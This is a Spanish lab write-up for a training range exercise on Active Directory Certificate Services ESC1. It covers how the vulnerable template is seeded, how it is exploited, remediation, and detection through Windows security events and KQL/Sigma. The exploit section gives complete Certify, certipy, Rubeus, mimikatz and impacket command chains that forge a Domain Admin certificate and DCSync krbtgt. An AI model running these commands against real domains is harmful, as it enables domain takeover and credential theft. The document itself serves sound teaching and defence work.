# AP05 — AD CS ESC1 (Enrollee-Supplies-Subject) en DC híbrido

**Capa:** Híbrido — AD DS + AD CS on-prem sobre Azure IaaS (módulo `hybrid-ad`)  
**Coste:** el AP **más caro** del range — única VM **Windows always-on**. `Standard_B2ms` ~0,083 €/h (~60 €/mes 24×7) o `Standard_B2s` como suelo (~0,041 €/h, ~30 €/mes); disco StandardSSD 127 GiB ~8-10 €/mes; IP pública Standard ~3-4 €/mes; ingesta de Log Analytics (5 EventID filtrados, ~0,1-0,3 GB/día) pocos €/mes. Con **auto-shutdown** diario (2200) y uso ~8 h/día baja a ~⅓ → orientativo **~20-40 €/mes**; `./caelum.ps1 destroy` lo lleva a 0. (West Europe, pay-as-you-go — verifica el precio actual.)  
**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) (Steal or Forge Authentication Certificates — *núcleo: AD CS*) · [T1550](https://attack.mitre.org/techniques/T1550/) (Use Alternate Authentication Material — *Pass-the-Certificate* vía PKINIT) · [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)  
**Mapea a cert:** CRTO / CRTE (AD CS abuse + Kerberos PKINIT + DCSync; lado defensivo adyacente: SC-200 / Microsoft Defender for Identity)  
**Precondición sembrada por el range:** bosque `caelum.lab` + Enterprise Root CA `caelum-CA`, ambos en una sola VM Windows Server 2022; usuario de **bajo privilegio** `ap05user` (UPN `ap05user@caelum.lab`, solo miembro de `Domain Users`); y la plantilla de certificado **vulnerable** `CaelumAuthESC1`, sembrada por `scripts/seed-ap05.ps1` vía `az vm run-command` en el `deploy` (simetría exacta con `seed-ap01.ps1`). La auditoría de la CA y de Kerberos (imprescindible para la capa 🔵) la habilita la **base DSC**, no el seed. **Lo que NO se siembra:** ninguna credencial de Domain Admin — el DA se **compromete forjando el certificado**.

---

## 🎯 Objetivo didáctico

Que el alumno interiorice que **una plantilla de certificado mal configurada es una primitiva de toma de dominio**: ESC1 convierte a *cualquier usuario del dominio* en *cualquier Domain Admin* sin robar una sola contraseña, sin tocar primero el LSASS del DC y sin ningún rol administrativo de partida. El atacante no roba una identidad privilegiada: **se la fabrica** pidiéndole a la CA un certificado de autenticación cuyo *subject* (el SAN) él mismo elige.

El eje conceptual es un único atributo *load-bearing*: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) en `msPKI-Certificate-Name-Flag`. Ese bit —y solo ese— permite al solicitante dictar la identidad que el certificado va a autenticar. Combinado con un EKU de autenticación, derechos de enrolamiento para principals de bajo privilegio, sin aprobación de manager y sin firmas RA, la cadena es determinista.

Las **cinco condiciones de ESC1** (simultáneas) que el range siembra en `CaelumAuthESC1` — el mapa del exploit y, en espejo, el de la remediación:

1. **Enroll de bajo privilegio (C1):** `Domain Users` tiene el *extended right* Certificate-Enrollment (`0e10c968-78fb-11d2-90d4-00c04f79dc55`) en el `nTSecurityDescriptor` → `ap05user` hereda Enroll.
2. **Sin aprobación de manager (C2):** `msPKI-Enrollment-Flag` **sin** `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`).
3. **Sin firmas RA (C3):** `msPKI-RA-Signature = 0`.
4. **EKU de autenticación de cliente (C4):** `pKIExtendedKeyUsage` / `msPKI-Certificate-Application-Policy` incluyen `1.3.6.1.5.5.7.3.2` (Client Authentication; equivalen Smart Card Logon `1.3.6.1.4.1.311.20.2.2`, PKINIT Client Auth `1.3.6.1.5.2.3.4`, Any Purpose `2.5.29.37.0` o SubCA).
5. **Enrollee-supplies-subject (C5 — el núcleo):** `msPKI-Certificate-Name-Flag` **con** `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) → el solicitante dicta el SAN. *Ojo: `0x1` vive en `msPKI-Certificate-Name-Flag`, **no** en `msPKI-Enrollment-Flag` (confusión habitual); la aprobación de manager —`0x2`— sí vive en `msPKI-Enrollment-Flag`.*

Rompe **cualquiera** de las cinco y ESC1 muere: por eso la sección 🟢 ofrece varios cortes independientes.

**Contraste con AP01-AP04 (identity-only Entra) — primera capa híbrida del range.** AP01-AP04 escalan dentro de Microsoft Entra ID por concesión de rol o de credencial (consent, ownership de grupo, ownership de app). AP05 baja a **AD CS on-prem**: la escalada es **criptográfica** (forjar un certificado de autenticación y usarlo por PKINIT), y la telemetría ya no son logs cloud de Entra (`AuditLogs`/`SigninLogs`) sino **eventos de Seguridad de Windows** del DC/CA (`SecurityEvent`), que **no existen en ningún SIEM** salvo que el range los ingiera (ver 🔵). Como contrapartida, toda la superficie vulnerable vive en **una sola VM desechable**: el reset no deja residuo *out-of-state* (tan limpio como AP07).

---

## 🔴 Rompe (cómo se explota)

> Laboratorio de entrenamiento autorizado, tenant/subscription de test propios. El bosque `caelum.lab` está aislado y **no** se sincroniza con ningún tenant (eso sería AP06). Todos los pasos parten de `ap05user` (bajo privilegio); el Domain Admin no se conoce de antemano.

La cadena canónica es `enrolamiento ESC1 → cert con SAN = UPN de un DA → PKINIT → TGT del DA → DCSync`. El range da **dos vías** según la postura de red que elija el operador.

### Vía A — Windows nativo por RDP (UX primaria, sin exponer puertos AD)

El NSG del módulo **no** abre LDAP/Kerberos/RPC a Internet. La ruta pensada es RDP al DC (desde `admin_source_cidr`) y ejecutar las herramientas Windows-nativas **como `ap05user`**. Referencia: **Certify.exe** + **Rubeus.exe** + **mimikatz** (GhostPack).

```powershell
# RDP a <ap05_dc_public_ip> como CAELUM\ap05user (origen = admin_source_cidr)

# 1. Enumerar plantillas vulnerables (ESC1)
.\Certify.exe find /vulnerable
#   → CaelumAuthESC1: ENROLLEE_SUPPLIES_SUBJECT + Client Authentication + Enroll de Domain Users

# 2. Solicitar el cert fijando el SAN = UPN de un Domain Admin
.\Certify.exe request /ca:dc.caelum.lab\caelum-CA /template:CaelumAuthESC1 /altname:administrator
#   → copia el bloque PEM (clave privada + cert) a cert.pem

# 3. PEM → PFX (Rubeus consume PFX)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
#   (asigna una password al PFX; Rubeus la pide en el paso 4)

# 4. PKINIT: pedir el TGT del DA con el cert forjado e inyectarlo en la sesión
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfxpass> /ptt

# 5. DCSync del krbtgt (o /all) con el TGT ya inyectado
.\mimikatz.exe "lsadump::dcsync /domain:caelum.lab /user:krbtgt" exit
```

### Vía B — certipy remoto (solo si el operador abrió los puertos AD a `admin_source_cidr`)

Si el operador relaja el NSG para exponer LDAP/Kerberos/RPC a su `/32`, el flujo equivalente desde una caja Linux del atacante con **certipy** (`ly4k`) + **impacket**:

```bash
# 1. Enumerar plantillas vulnerables como el usuario de bajo privilegio
certipy find -u 'ap05user@caelum.lab' -p '<ap05user_pass>' \
  -dc-ip <ap05_dc_public_ip> -vulnerable -stdout
#   → marca CaelumAuthESC1 como ESC1

# 2. Solicitar el cert con SAN = UPN de un Domain Admin
certipy req -u 'ap05user@caelum.lab' -p '<ap05user_pass>' \
  -dc-ip <ap05_dc_public_ip> -ca 'caelum-CA' \
  -template 'CaelumAuthESC1' -upn 'administrator@caelum.lab'
#   → administrator.pfx

# 3. PKINIT con el cert forjado → TGT + (UnPAC-the-hash) hash NT del DA
certipy auth -pfx 'administrator.pfx' -dc-ip <ap05_dc_public_ip>
#   → administrator.ccache  +  NT hash de administrator

# 4. DCSync como Domain Admin (ticket o hash)
KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass \
  'caelum.lab/administrator@dc.caelum.lab' -just-dc-user 'CAELUM/krbtgt'
#   alternativa con el hash recuperado:
#   impacket-secretsdump -hashes :<nt_hash> 'caelum.lab/administrator@<ap05_dc_public_ip>'
```

Descubrimiento con grafo: **Certipy** marca la plantilla como vulnerable directamente; **BloodHound** (colector con soporte de AD CS / `Certipy ... -bloodhound`) dibuja la arista de enrolamiento de `ap05user` sobre `CaelumAuthESC1` y su ruta a Domain Admin.

> **Caveat — el SAN lo pone el solicitante, no la plantilla.** `CaelumAuthESC1` no "contiene" al administrator: el bit `ENROLLEE_SUPPLIES_SUBJECT` deja que `-altname`/`-upn` lo inyecte en tiempo de solicitud. Por eso ESC1 puro **no** necesita `EDITF_ATTRIBUTESUBJECTALTNAME2` en la CA (eso sería ESC6, una ruta distinta y más ruidosa).

> **Caveat — KB5014754 / strong mapping.** El lab corre con `StrongCertificateBindingEnforcement = 1` (Compatibility) **a propósito**, de modo que el KDC acepta el mapeo implícito por UPN y el PKINIT forjado funciona. Bajo **Full Enforcement** (valor `2`, o por defecto tras la actualización de seguridad del **9 de septiembre de 2025**) el KDC valida la extensión de SID del certificado (`szOID_NTDS_CA_SECURITY_EXT`, que porta el SID del **solicitante** `ap05user`, no el del SAN `administrator`) y **deniega** el logon → la cadena 🔴 falla y el lab *parece* «ya parcheado». certipy reciente puede incrustar un SID forjado (`-sid`), pero bajo Full Enforcement el forge igualmente cae porque el SID no casa con la cuenta autenticada. Esto **es** el fix de plataforma real (ver 🟢).

> **Caveat — propagación / auto-shutdown.** Ejecuta `deploy` + ataque en la misma sesión: una VM *deallocada* por el auto-shutdown (2200) no sirve RDP ni `az vm run-command`, y el DCPromo tarda ~15-25 min en quedar `Compliant` tras el primer `apply`.

### Toma del dominio

Con el hash de `krbtgt` del DCSync: **Golden Ticket** (persistencia total), o directamente el hash NT de `administrator` para `pass-the-hash`, creación de cuentas, modificación de GPO, etc. El certificado forjado, además, es **persistencia por sí mismo**: sobrevive a un cambio de contraseña del DA y es válido hasta que caduque o se revoque el cert.

---

## 🟢 Arregla (remediación)

Cada una de estas acciones **corta ESC1 por separado** (rompe una de las cinco condiciones). Aplícalas en profundidad.

1. **Quitar `ENROLLEE_SUPPLIES_SUBJECT` (C5 — el antídoto directo).** Que el *subject* lo construya la CA a partir de AD, no el solicitante. En la GUI (`certtmpl.msc`): pestaña *Subject Name* → **desmarcar** «Supply in the request» → marcar «Build from this Active Directory information». A bajo nivel: limpiar el bit `0x1` de `msPKI-Certificate-Name-Flag`.

2. **Exigir aprobación de manager (C2).** Poner `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`) en `msPKI-Enrollment-Flag`: cada solicitud queda *pending* hasta que un CA manager la aprueba → se acaba la emisión automática.

3. **Restringir el ACL de Enroll (C1).** Retirar el *extended right* Certificate-Enrollment a `Domain Users` / `Authenticated Users` y dejarlo solo en principals explícitos y auditados. Una plantilla de autenticación **nunca** debería ser enrolable por todo el dominio.

4. **Despublicar la plantilla.** `certutil -SetCATemplates -CaelumAuthESC1` (o *Certification Authority* → *Certificate Templates* → *Delete*). Retira la plantilla de `certificateTemplates` del *Enrollment Services* → deja de ser **solicitable** aunque el objeto siga existiendo.

5. **Higiene de CA — `EDITF_ATTRIBUTESUBJECTALTNAME2` (defensa en profundidad, corta ESC6).** No es necesario para neutralizar ESC1 puro, pero una CA con este flag permite inyectar SANs arbitrarios **en cualquier** plantilla: desactívalo.
   ```powershell
   certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
   net stop certsvc && net start certsvc
   ```

6. **KB5014754 — strong certificate mapping (control de plataforma / de fondo).** Llevar los DC a **Full Enforcement** (`StrongCertificateBindingEnforcement = 2`) hace que, aun con una plantilla mal configurada, el KDC rechace un cert cuyo SID de solicitante no case con la cuenta objetivo → el forge con SAN de DA deja de autenticar. Es el refuerzo que vuelve inefectiva toda la clase de ataques de SAN forjado.

> **KB5014754 como control enseñable.** La base del lab fija `StrongCertificateBindingEnforcement = 1` (Compatibility) **a propósito**, para que el forge sea explotable. Desde la actualización de **febrero de 2025** los DC pasan a **Full Enforcement** por defecto si el valor no está configurado, y el *opt-out* a Compatibility **solo se honra hasta la actualización de seguridad del 9 de septiembre de 2025**. Si parcheas el DC más allá de esa fecha, cuenta con que el forge deje de funcionar (la pata 🔵 **sigue disparando**: la emisión del cert y el intento de PKINIT se registran igual, aunque el logon final se bloquee).

### Remediación in-place en el range (el ejercicio "Arregla")

`scripts/seed-ap05.ps1 -Remediate` corrige la plantilla **dejando el DC/CA/telemetría en pie**, para que el alumno re-ejecute el ataque y la detección contra el estado ya corregido y compruebe que `certipy find` deja de marcarla `-vulnerable`. Aplica varios cortes a la vez (limpia `0x1` de `msPKI-Certificate-Name-Flag`, añade `0x2` a `msPKI-Enrollment-Flag` y despublica). Invocación simétrica con el seed del `deploy`:

```bash
az vm run-command invoke \
  -g <ap05_resource_group> -n <ap05_dc_vm_name> \
  --command-id RunPowerShellScript \
  --scripts @scripts/seed-ap05.ps1 \
  --parameters Remediate=true EaPassword='<dc_admin_password>' \
               DomainFqdn=caelum.lab DomainNetbios=CAELUM \
               TemplateName=CaelumAuthESC1 CaCommonName=caelum-CA
```

> **Dos niveles de reset — no los confundas.** (1) **Duro / coste→0:** `./caelum.ps1 reset` re-aplica con `enable_ap05 = false` (`count = 0`) → Terraform **destruye la VM entera** y con ella, atómicamente, la plantilla `CaelumAuthESC1`, los certificados forjados/emitidos y la CA DB. Es un reset sin residuo *out-of-state* (empata con AP07 como el más limpio del range): a diferencia de AP02/AP03/AP04 (donde las acciones del atacante quedan *fuera* del estado de Terraform y hay que limpiarlas a mano), aquí toda la superficie vulnerable vive en una VM desechable → cero residuo *out-of-state*, coste posterior cero. (2) **In-place / pedagógico:** `seed-ap05.ps1 -Remediate` (arriba). `./caelum.ps1 reset` **no** pre-remedia AP05 por `run-command` (divergencia deliberada frente a AP01: la vuln vive en la VM destruible, que además puede estar *deallocada* por el auto-shutdown y haría fallar el `run-command`). La plantilla **no** es un recurso `azurerm` (Terraform no gestiona plantillas de AD CS: son objetos del *Configuration NC* del DC) — justo esa propiedad es la que da el reset limpio. En un DC **vivo**, `enable_ap05=false` destruye la VM (y la plantilla), pero **no** "arregla" un DC en marcha hasta reaplicar/destruir; para eso está `-Remediate`.

---

## 🔵 Detecta

La fuente son **eventos de Seguridad de Windows** del DC/CA (on-prem — **no** hay `AuditLogs`/`SigninLogs` de Entra). El módulo `hybrid-ad` **provisiona el pipeline por defecto** (gated por `enable_ap05 && collect_security_events`): **Azure Monitor Agent (AMA)** + **Data Collection Rule (DCR)** filtrada a 5 EventID + **Log Analytics** (o un Sentinel externo vía `existing_log_analytics_workspace_id`). Sin este pipeline los eventos **no existen en ningún SIEM**, así que "Detecta" solo es testeable de punta a punta si el range los ingiere. Tabla KQL: **`SecurityEvent`**.

- KQL (Sentinel / Defender XDR): [`../../detections/kql/AP05-adcs-esc1.kql`](../../detections/kql/AP05-adcs-esc1.kql)
- Sigma: [`../../detections/sigma/AP05-adcs-esc1.yml`](../../detections/sigma/AP05-adcs-esc1.yml)

**Señales (tabla `SecurityEvent`):**

| Señal | EventID | Qué mirar |
|---|---|---|
| Solicitud de certificado a la CA | `4886` | `CertificateTemplate == CaelumAuthESC1`; *requester* = `ap05user` |
| **Emisión** del certificado por la CA | `4887` | `CertificateTemplate == CaelumAuthESC1` — *honeytemplate*: **cualquier** emisión es sospechosa de por sí |
| Cambio de plantilla / de seguridad del servicio de certificados | `4899` / `4900` | el propio **sembrado** o manipulación de la plantilla (el defensor *ve plantarse* la vuln) |
| TGT Kerberos vía **PKINIT** | `4768` | *Certificate Information* poblada (`CertThumbprint`/`CertSerialNumber` no vacíos, `PreAuthType = 16`); cuenta = `administrator` |
| (Complementario, canal *System*, post-KB5014754) | `Kerberos-Key-Distribution-Center 39/41` | SID del solicitante ≠ SID del subject → mapeo débil/rechazo |

**Prerrequisito imprescindible (lo habilita la base DSC, no el seed, para que persista entre ciclos seed/remediate):** auditoría de la CA (`certutil -setreg CA\AuditFilter 127` + `auditpol` subcategoría *Certification Services* + `Restart-Service certsvc`) para `4886/4887/4899/4900`, y *Audit Kerberos Authentication Service* (Success) para `4768`. Sin esto, **los eventos no se generan** y la detección falla en vacío. Como la DSC corre en `deploy` **antes** del seed post-apply, el propio sembrado de la plantilla ya dispara `4899/4900` — punto didáctico: el defensor observa cómo se planta la vulnerabilidad.

**Lógica de correlación (lección de AP04): OR, nunca un AND global.** El SAN **no viaja de forma fiable** en `4886/4887` (vive en la CA DB / `certutil -view`: `Request.RequesterName` vs. el SAN del cert emitido), así que la regla **no** se apoya en un `requester != SAN` que descartaría en silencio detecciones reales. Cada señal **dispara por sí sola**: (a) cualquier enrolamiento de la *honeytemplate* es sospechoso; (b) un `4768` PKINIT para una cuenta privilegiada; (c) un `4899/4900` fuera de una ventana de cambio aprobada. La correlación `4887 → 4768` (mismo *thumbprint*/*serial*, cuenta distinta/privilegiada, ventana corta) es un **booster de fidelidad**, no un *gate*. `4768` es alto volumen (todo TGT) → el KQL lo acota a PKINIT + *Certificate Information* para contener ruido y coste.

**Complemento gestionado:** **Microsoft Defender for Identity** trae detección **nativa de ESC1** (y del resto de ESCx) sobre los DC con sensor — recomendada junto a estas reglas.

> **Coste de ingesta.** Un feed de un solo DC **filtrado a 5 EventID** queda muy por debajo de 0,1-0,3 GB/día → pocos €/mes (31 d de retención incluidos). Filtra **siempre** el xPath del DCR a esos EventID: un canal *Security* sin filtrar dispara el coste de Log Analytics. Se desactiva con `collect_security_events = false` o apuntando a un workspace externo.

---

## 📚 Referencias

- SpecterOps — Will Schroeder & Lee Christensen, *Certified Pre-Owned: Abusing Active Directory Certificate Services* (definición y taxonomía de ESC1): [posts.specterops.io/certified-pre-owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- Microsoft — [KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/help/5014754) (`StrongCertificateBindingEnforcement`; Compatibility vs Full Enforcement; opt-out hasta 9-sep-2025; eventos 39-41; `szOID_NTDS_CA_SECURITY_EXT` — validado 2026-11)
- HackTricks — [AD CS Domain Escalation (ESC1)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
- Herramientas: **Certipy** ([github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)), **GhostPack Certify** ([github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)) + **Rubeus** ([github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)), **impacket** (`secretsdump`), **mimikatz** (`lsadump::dcsync`), **BloodHound** (soporte AD CS)
- Microsoft Learn — *Configure Certification Authority auditing* (`AuditFilter`), *Audit Kerberos Authentication Service* (evento 4768), *Microsoft Defender for Identity — AD CS (ESC1) detections*
- MITRE ATT&CK — [T1649](https://attack.mitre.org/techniques/T1649/), [T1550](https://attack.mitre.org/techniques/T1550/), [T1003.006](https://attack.mitre.org/techniques/T1003/006/)
- Comparar con [AP02](./AP02-managed-identity.md) — mismo patrón de VM/coste/auto-shutdown (el único otro AP que factura cómputo). La siguiente capa híbrida (AP06 — Entra Connect / Seamless SSO) queda **fuera de alcance** aquí: AP05 es AD CS on-prem puro, sin sincronización con el tenant.
